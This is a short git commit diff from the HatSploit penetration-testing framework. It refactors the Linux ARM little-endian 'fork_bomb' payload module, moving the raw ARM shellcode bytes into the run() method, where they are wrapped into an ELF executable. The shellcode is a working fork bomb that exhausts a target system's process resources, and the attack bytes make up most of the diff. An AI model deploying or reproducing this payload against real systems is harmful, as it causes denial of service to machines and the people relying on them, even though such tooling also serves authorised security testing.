8152357414c21d44cf47fc4ad6297c1a70acefe8
Ivan Nikolsky <enty8080@gmail.com>
2021-08-18 02:14:16 +0200

    Update fork_bomb.py

--- hatsploit/payloads/linux/armle/fork_bomb.py
+++ hatsploit/payloads/linux/armle/fork_bomb.py
@@ -27,11 +27,11 @@ class HatSploitPayload(Payload, HatVenom):
         'Type': "one_side"
     }
 
-    payload = (
-        b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x7f\x40"
-        b"\x02\x27\x01\xdf\xc0\x46\xff\xf7\xfa\xff"
-    )
-
     def run(self):
-        payload = self.generate('elf', 'armle', self.payload)
+        shellcode = (
+            b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x7f\x40"
+            b"\x02\x27\x01\xdf\xc0\x46\xff\xf7\xfa\xff"
+        )
+
+        payload = self.generate('elf', 'armle', shellcode)
         return payload
